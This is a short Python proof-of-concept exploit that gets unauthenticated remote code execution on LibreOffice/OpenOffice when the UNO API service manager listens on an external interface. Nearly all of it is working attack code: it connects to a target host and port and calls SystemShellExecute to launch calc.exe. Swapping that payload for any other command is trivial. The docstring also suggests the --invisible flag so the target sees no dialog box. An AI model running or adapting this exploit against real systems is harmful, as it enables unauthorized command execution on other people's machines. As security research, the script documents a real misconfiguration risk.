"""
Author: Axel Boesenach
Date: 18-09-2018

Unauthenticated RCE LibreOffice/OpenOffice with UNO API

This code represents a small proof of concept of an unauthenticted remote code execution using
the Apache OpenOffice UNO API (https://www.openoffice.org/udk/). This code has been tested
against LibreOffice Version: 6.1.1.2 on a Ubuntu Mate 18.04 with kernel 4.15.0-34-generic.

For this PoC to work the target machine needs to run the ServiceManager using an external 
interface. The following command was used to test this PoC:

[Windows]
In the folder containing the LibreOffice/OpenOffice installation
soffice --accept='socket,host=0.0.0.0,port=2002;urp;StarOffice.Service'

The above command will start the LibreOffice ServiceManager but this can be executed with the --invisible
flag to prevent the dialogbox from popping up on the target.
"""
import uno
from com.sun.star.system import XSystemShellExecute
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('--host', help='host to connect to', dest='host', required=True)
parser.add_argument('--port', help='port to connect to', dest='port', required=True)

args = parser.parse_args()
# Define the UNO component
localContext = uno.getComponentContext()
# Define the resolver to use, this is used to connect with the API
resolver = localContext.ServiceManager.createInstanceWithContext(
				"com.sun.star.bridge.UnoUrlResolver", localContext )
# Connect with the provided host on the provided target port
print("[+] Connecting to target...")
context = resolver.resolve(
	"uno:socket,host={0},port={1};urp;StarOffice.ComponentContext".format(args.host,args.port))
# Issue the service manager to spawn the SystemShellExecute module and execute calc.exe
service_manager = context.ServiceManager
print("[+] Connected to {0}".format(args.host))
shell_execute = service_manager.createInstance("com.sun.star.system.SystemShellExecute")
shell_execute.execute("calc.exe", '',1)
